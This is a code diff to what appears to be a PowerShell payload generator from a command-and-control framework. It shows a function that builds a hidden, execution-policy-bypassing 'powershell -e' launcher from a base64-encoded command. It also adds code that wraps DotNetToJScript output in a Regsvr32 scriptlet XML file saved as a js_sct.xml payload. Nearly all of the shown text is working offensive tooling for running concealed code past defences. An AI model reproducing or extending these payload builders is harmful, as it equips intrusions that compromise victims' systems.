@@ -93,8 +93,7 @@ ghgfhgfh.ShellExecute "powershell.exe", "'+$payloadparams+'", "", "open", 0
 
 #Regsrv32 SCT file
 function cs_sct
-{
-    
+{ 
     $bytes = [System.Text.Encoding]::Unicode.GetBytes($command)
     $payloadraw = 'powershell -exec bypass -Noninteractive -windowstyle hidden -e '+[Convert]::ToBase64String($bytes)
     $payload = $payloadraw -replace "`n", ""
@@ -254,6 +253,26 @@ function poshjs
 {
 $t = IEX "$PoshPath\DotNetToJS\DotNetToJScript.exe -c Program -o `"$global:newdir\payloads\posh.js`" `"$global:newdir\payloads\posh.exe`"" 2>&1 
 Write-Host -Object "DotNetToJS Created .js Payload written to: $global:newdir\payloads\posh.js"  -ForegroundColor Green
+$dotnettojs = Get-Content $global:newdir\payloads\posh.js | Out-String
+
+$snippetjs = '<?XML version="1.0"?>
+<scriptlet>
+
+<registration 
+progid="Y"
+classid="{F0001111-0000-0000-0000-0000FEEDACDC}" >
+</registration>
+
+<script language="JScript">
+'+$dotnettojs+'	
+</script>
+
+</scriptlet>'
+
+$JSSCTFile = "$global:newdir\payloads\js_sct.xml"
+Out-File -InputObject $snippetjs -Encoding ascii -FilePath $JSSCTFile
+Write-Host -Object "JS_SCT Payload written to: $global:newdir\payloads\js_sct.xml"  -ForegroundColor Green
+
 }
 
 
